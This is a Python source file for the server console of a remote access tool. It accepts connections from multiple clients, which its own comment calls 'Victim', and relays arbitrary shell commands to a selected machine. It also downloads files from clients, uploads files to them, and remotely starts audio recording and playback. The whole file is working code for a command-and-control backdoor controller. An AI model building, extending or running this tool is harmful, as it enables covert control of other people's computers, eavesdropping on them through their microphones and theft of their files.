import socket
import sys
import os
import re
from threading import Thread
from queue import Queue

def clear_screen():
    if os.name=="nt":
        os.system("cls")
    else:
        os.system("clear")

class Server:

    def __init__(self,host="",port=2307):
        try:
            self.socket_obj = socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM)
            self.socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.host = host
            self.port = port
        except socket.error as msg:
            print("Socket creation error: {}".format(str(msg)))

    def bind(self):
        '''
            This function is to bind port with our socket and then
            start listening on that port
        '''
        try:
            print("Binding to port {} ...".format(self.port))
            self.socket_obj.bind(( self.host, self.port ))
            
            # One argument is listen function is the no. of unaccepted connection allowed before refusing new connections
            print("Listening...")
            self.socket_obj.listen(5)
        except socket.error as msg:
            print("Socket Binding error {}".format(str(msg)))
            print("Retrying...")
            self.bind()

    def accept_connections(self):
        global ALL_CONNECTIONS
        '''
            This function is for Establishing Connections before that socket must be listening
        '''
        while True:
            try:
                conn, address = self.socket_obj.accept()
                self.socket_obj.setblocking(1) # to prevent timeout
                ALL_CONNECTIONS.append( (conn,address) )
                # print("Connection has been established! | {}:{}".format(address[0],address[1]))
            except:
                print("Error in accepting connections")

    @staticmethod
    def send_target_commands(conn):
        '''
            in this function we are sending commands to our Friend/Victim/Client
            whose connection object is passed inside function arguments
        '''
        global FILES_ROOT_PATH
        # We have to run an infinite loop to set persistence after one command unless after this function call conn is closed
        while True:
            # try:
            command = input()
            if command.strip()=="quit":
                break
            elif re.fullmatch("download [\w.]+",command.strip())!=None:
                filename = re.fullmatch("download ([\w.]+)",command.strip()).group(1)
                conn.send( str.encode( "-send_file {}".format(filename), "utf-8" ) ) #send triger
                client_reponse = str( conn.recv(1024), "utf-8" ).split("|")
                if client_reponse[0]=="file_found":
                    print("File {} Exists".format(filename))
                    print("Downloading...")
                    file_data = conn.recv(20480)  # Receiving Data
                    if not os.path.exists('files'):
                        os.makedirs('files')
                    with open( FILES_ROOT_PATH + "/" + filename, "wb" ) as file:
                        file.write(file_data)
                    print("File {} Downloaded".format(filename))
                    print( client_reponse[1], end="" )
                else:
                    print("File not exists!")
                    print( client_reponse[1], end="" )

            elif re.fullmatch("play [\w.:]+",command.strip())!=None:
                filename = re.fullmatch("play ([\w.:]+)",command.strip()).group(1)
                conn.send( str.encode("-play {}".format(filename)) )
                client_reponse = str( conn.recv(20480), 'utf-8' )
                if client_reponse=="playing":
                    print("Playing...")
                else:
                    print("Error while playing")
                client_reponse = str( conn.recv(20480), 'utf-8' )
                print(client_reponse, end="")
            elif re.fullmatch("record [1-9]\d*",command.strip())!=None:
                duration = re.fullmatch("record ([1-9]\d*)",command.strip()).group(1)
                conn.send( str.encode("-record {}".format(duration)) )
                client_reponse = str( conn.recv(20480), 'utf-8' )
                if client_reponse=="recording":
                    print("Recording...")
                else:
                    print("Error while recording")
                client_reponse = str( conn.recv(20480), 'utf-8' )
                print(client_reponse, end="")

            elif len(str.encode(command)) > 0:
                conn.send( str.encode(command) )
                client_reponse = str( conn.recv(20480), "utf-8" )
                print(client_reponse, end="")
            # except:
                # print("Error sending commands")
                # break 

    def start(self):
        self.bind()
        self.accept_connections()



def list_connections():
    global ALL_CONNECTIONS
    active_clients = []
    for i,conn in enumerate(ALL_CONNECTIONS):
        try:
            conn[0].send(str.encode("  "))
            conn[0].recv(201480)
        except:
            del ALL_CONNECTIONS[i] #delete inactive clients
            continue
        
        active_clients.append( conn )
    
    if active_clients:
        print("-----Clients-----")
        for i,conn in enumerate(active_clients):
            print("{}- {}:{}".format(i+1,conn[1][0],conn[1][1]))
    else:
        print("No client is active!")

def get_target(cmd):
    global ALL_CONNECTIONS
    try:
        conn = ALL_CONNECTIONS[int(cmd)]
        return conn
    except:
        return None


def create_worker():
    global NUMBER_OF_THREADS
    for _ in range(NUMBER_OF_THREADS):
        t = Thread(target=work)
        t.daemon = True
        t.start()

def work():
    global JOB_QUEUE
    while True:
        x = JOB_QUEUE.get()
        if type(x)==tuple and x[0]==1:
            server = Server(port=x[1])
            server.start()
        else:
            start_shell()

    JOB_QUEUE.task_done()

def create_job():
    global JOB_NUMBER, JOB_QUEUE
    for x in JOB_NUMBER:
        JOB_QUEUE.put(x)

    JOB_QUEUE.join()
    
def start_shell():
    global FILES_ROOT_PATH
    while True:
        cmd = input("--:--> ").strip()
        if cmd=="list":
            list_connections()
        elif cmd=="clear":
            clear_screen()
        # For send file to clients
        elif re.fullmatch("send_file [\w.]+",cmd)!=None:
            filename = re.fullmatch("send_file ([\w.]+)",cmd).group(1)
            list_connections()
            selected_conn = input("Enter Client No.: ")
            if re.fullmatch("\s*(\d)\s*",selected_conn)!=None:
                target = get_target( int( re.fullmatch("\s*(\d)\s*",selected_conn).group(1) ) - 1 )
                if target:
                    conn, address = target
                    if os.path.isfile(FILES_ROOT_PATH + "/" + filename):
                        with open(FILES_ROOT_PATH + "/" + filename,"rb") as file:
                            data = file.read()

                            # Send a msg so that client start receiving
                            conn.send( str.encode( "-recv_file {}".format(filename) ,"utf-8") )
                            client_reponse = str( conn.recv(20480), "utf-8" ) #get reponse and check if its receiving
                            if client_reponse=="receiving":
                                print("Sending...")
                                conn.send( data ) # Send file data
                                client_reponse = str( conn.recv(20480), "utf-8" ) # get reponse
                                if client_reponse=="received":
                                    print("Sending file complete")
                                else:
                                    print("Error on client side")
                            else:
                                print("Error on client side")
                    else:
                        print("File Not Exist!")
                else:
                    print("Invlid Selection")
            else:
                print("Invalid Selection")
        elif re.fullmatch("select\s+(\d+)", cmd)!=None:
            selected_client_no = int(re.fullmatch("\s*select\s+(\d+)\s*", cmd).group(1))
            target = get_target(selected_client_no-1)
            if target is not None:
                conn, address = target
                print("You are now connected to {}:{}".format(address[0],address[1]))
                print("{}> ".format(address[0]) ,end="")
                Server.send_target_commands(conn)
            else:
                print("Invalid Selection")
        else:
            print("Invalid Command")


if __name__=="__main__":
    NUMBER_OF_THREADS = 2
    JOB_NUMBER = [(1,2307),2]
    # JOB_NUMBER = [(1,2307),(1,2308),(1,2309),2]
    JOB_QUEUE = Queue()
    ALL_CONNECTIONS = []
    FILES_ROOT_PATH = "files"
    create_worker()
    create_job() 



